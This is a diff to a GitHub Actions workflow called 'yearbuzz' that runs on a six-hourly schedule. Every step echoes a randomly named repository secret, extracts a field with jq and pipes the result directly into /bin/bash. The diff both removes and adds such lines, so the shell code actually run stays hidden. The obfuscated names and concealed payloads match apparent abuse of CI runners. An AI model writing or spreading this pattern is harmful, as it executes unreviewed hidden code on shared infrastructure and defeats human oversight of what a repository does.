@@ -3,30 +3,17 @@ name: yearbuzz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
-jobs:  # 25707
+    - cron: '5 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yearbuzz
         env:
-          fi22: ${{ secrets.fi22 }}
+          vyxef60306: ${{ secrets.vyxef60306 }}
         run: |
-          echo $fi22 | jq -r .mju563 | /bin/bash
-          echo $fctg12351 | jq -r .f2754 | /bin/bash
-          echo $zfl38663 | jq -r .c0 | /bin/bash
-          echo $dyg178 | jq -r .fm4 | /bin/bash
-          echo $hqr7618 | jq -r .juw1 | /bin/bash
-          echo $as309 | jq -r .i4810 | /bin/bash
-          echo $nhy3119 | jq -r .dynu125 | /bin/bash
-          echo $bmxkf072 | jq -r .ar59 | /bin/bash
-          echo $pswjg4897 | jq -r .xs451 | /bin/bash
-          echo $gdf1534 | jq -r .rfjz83926 | /bin/bash
-          echo $cct47802 | jq -r .g57 | /bin/bash
-          echo $erui2 | jq -r .qnoc072 | /bin/bash
-          echo $jc2 | jq -r .qpr09637 | /bin/bash
-          echo $rjs12 | jq -r .s57 | /bin/bash
-          echo $d990 | jq -r .x0 | /bin/bash
+          echo $vyxef60306 | jq -r .dqi87 | /bin/bash
+          echo $tntfc73273 | jq -r .dvtbm181 | /bin/bash
+          echo $x7819 | jq -r .mducn3780 | /bin/bash
 
